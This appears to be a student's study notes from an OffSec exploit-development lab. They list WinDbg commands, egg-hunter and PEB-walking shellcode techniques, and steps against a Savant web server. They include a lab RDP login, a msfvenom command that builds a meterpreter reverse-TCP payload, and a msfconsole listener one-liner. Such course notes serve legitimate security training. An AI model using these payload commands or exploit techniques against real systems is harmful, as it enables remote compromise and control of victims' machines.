xfreerdp /u:Offsec /p:lab /v:192.168.115.10 /dynamic-resolution

---------------------------------------
Windbg views:
	1. Disassembly 2. Registers 3. Command

---------------------------------------
Windbg cmds:

1.	g

2. dds @esp L5

3.	.load narly
	!nmod

4. dc poi(esp+4)

5. s -d 0 L?80000000 41414141
   s -a 0 L?80000000 "This program cannot be run in DOS mode"
   s -[1]b 00400000 00452000 58 c3 (search: pop eax ret)
   s -a 0x0 L?80000000 w00tw00t

6. r (show registers)
   r ecx=41414141

7. bp kernel32!WriteFile
   bl
   bd 0 (disable index 0)
   be 0 (enable index 0)
   bu ole32!WriteStringStream (breakpoint on an unresolved function)
   bp kernel32!WriteFile ".printf \"The number of bytes written is: %p\", poi(esp + 0x0C);.echo;g"
   bp kernel32!WriteFile ".if (poi(esp + 0x0C) != 4) {gc} .else {.printf \"The number of bytes written is 4\";.echo;}"

   ba e 1 kernel32!WriteFile (hardware breakpoint, e (execute), r (read), or w (write))

8. lm m kernel*
9. x kernelbase!CreateProc* (exam symbols)

10. ? 77269bc0  - 77231430
	? 77269bc0 >> 18

11. ? 41414141
	? 0n41414141
	? 0y1110100110111
	.formats 41414141

12. u poi(@esp+0x04) (disassembly from (esp+4) pointed address)

13. !teb

14. !address 01365a5e (information about certain address)

15. lm m ntdll
---------------------------------------
Linux cmds:

1.	msf-pattern_create -l 800

2. 	msf-nasm_shell

3. a: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=443 -f python -v  payload
   b: sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.119.120; set LPORT 443; exploit"
	
---------------------------------------

Keystone:
	sudo apt install python3-pip
	pip install keystone-engine

---------------------------------------

m-6 (Savant):
	1. esp+4 points to the buffer.
	2. pop eax, ret. to jmp to buffer.
	3. 'GET' at start of buffer change to \xeb\x17\x90\x90,
		which is short jmp next 0x17 bytes. (not work)
	4. another way: httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /"  # xor ecx, ecx; test ecx, ecx; je 0x17
	(all jmp 0x17 from beginning address of current assembly)
	5.  rather than terminating the HTTP request, we could add an additional buffer after the first carriage return (\r) and new-line (\n), search its magic bytes "w00tw00t" in memory, found it is on heap.
	6. Keystone Engine to find additional buffer on heap.
	7. egg hunt (crawls through the entire memory space for magic bytes)
		Keystone Engine: embed assembly code in python poc, not using hex code directly.
		python: from keystone import *
		issue to combat: no way of telling beforehand if a memory page is mapped
			use NtAccessCheckAndAuditAlarm (system call did not change until Windows 8)
			ref: https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FSecurity%2FNtAccessCheckAndAuditAlarm.html
			if has access: return STATUS_NO_IMPERSONATION_TOKEN
			if not: STATUS_ACCESS_VIOLATION 
	8. reverse shell: msfvenom
	9. because NtAccessCheckAndAuditAlarm system call chages by Windows version, use SEH egg hunter.

---------------------------------------

m-7 Custom Shellcode (t !!)
	1. ctype & keystone, make windows api calls
	2. LoadLibraryA, GetModuleHandleA, GetProcAddress
	3. problem: need to know addresses of step 2.
	4. Understanding Windows Shellcode: 
		https://www.hick.org/code/skape/papers/win32-shellcode.pdf
	Win32 Assembly Components:
		https://www.offsec.com/awe/AWEPAPERS/winasm-1.0.1.pdf
	5. 3 methods: PEB, SEH, "Top Stack", only talks PEB.
	6. PEB method, test on windbg:
		dt nt!_TEB @$teb 
			(view teb)
		dt nt!_PEB 0x7f60b000 
			(view PEB address read from teb, PEB addr at offset 0x30 of the TEB)
		dt _PEB_LDR_DATA 0x776c9aa0 
			(view _PEB_LDR_DATA from nt!_PEB)
			found: InLoadOrderModuleList, InMemoryOrderModuleList, InInitializationOrderModuleList
		dt _LIST_ENTRY (0x776c9aa0 + 0x1c) 
			(view InInitializationOrderModuleList)
		dt _LDR_DATA_TABLE_ENTRY (0x04011658 - 0x10) 
			(subtract 0x10 from _LIST_ENTRY to reach _LDR_DATA_TABLE_ENTRY_ structure)
			it contains: 
				1. +0x018 DllBase          : 0x775c0000 Void
				2. +0x02c BaseDllName      : _UNICODE_STRING "ntdll.dll"

	7. write shell code of step 6 by keystone, check dll name length.  "kernel32.dll" string is 12 bytes UNICODE 
		check the 25th byte is NULL. If the comparison fails, take a conditional jump to next_module and check.
	





---------------------------------------
